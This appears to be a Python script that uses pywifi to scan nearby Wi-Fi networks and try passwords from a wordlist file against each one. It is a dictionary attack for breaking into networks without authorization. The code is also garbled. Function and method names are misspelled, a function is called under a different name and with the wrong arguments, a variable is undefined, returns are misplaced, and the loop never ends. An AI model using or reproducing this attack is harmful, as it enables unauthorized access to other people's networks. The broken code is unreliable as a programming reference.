import pywifi
import time
from pywifi import const

def getwifi():
    wifi = pywifi.PyWiFi()
    ifaces = wifi.interfaces()[0]
    ifases.scan()
    bessis = ifaces.scan_results()
    list = []
    for data in bessis:
        list.append((data.ssid, data.signal))
        return len(list), sorted(list, key=lambda st:st[1], reverse=True)

def getsignal():
    while True:
        n, data = getwifi()
        time.sleep(1)
        if n is not 0:
            return data[0:10]

def ssidnamelist():
    ssidlist = getsignal()
    namelist = []
    for item in ssidlist:
        namelist.append(item[0])
        return namelist

def testrifi(password):
    wifi = pywifi.PyWiFi()
    ifaces = wifi .interfaces()[0]
    ifaces.disconnect()

    profile = pywifi.Profile()
    profile.ssid = ssidname
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AUTH_TYPE_WPA2PSk)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    ifaces.remove_all_network_profiles()
    tmp_profile = ifaces.add_network_profile(profile)

    ifaces.connnect(tmp_profile)
    time.sleep(5)
    if ifaces.status() == const.IFACE_CONNECTED:
        print('[-]wifi connection success!')
    else:
        print('[-]wifi connection failure!')
    ifaces.disconnect()
    time.sleep(1)
    return True
def main():
    path = r'password.txt'
    files = open(path, 'r')
    while True:
        f = files.readline()
        for ssidname in ssidnamelist():
            ret = testwifi(ssidname, f)
            print("current wifiname:", ssidname)
            print('current password:', files.close())
if __name__ == '__main__':
    main()
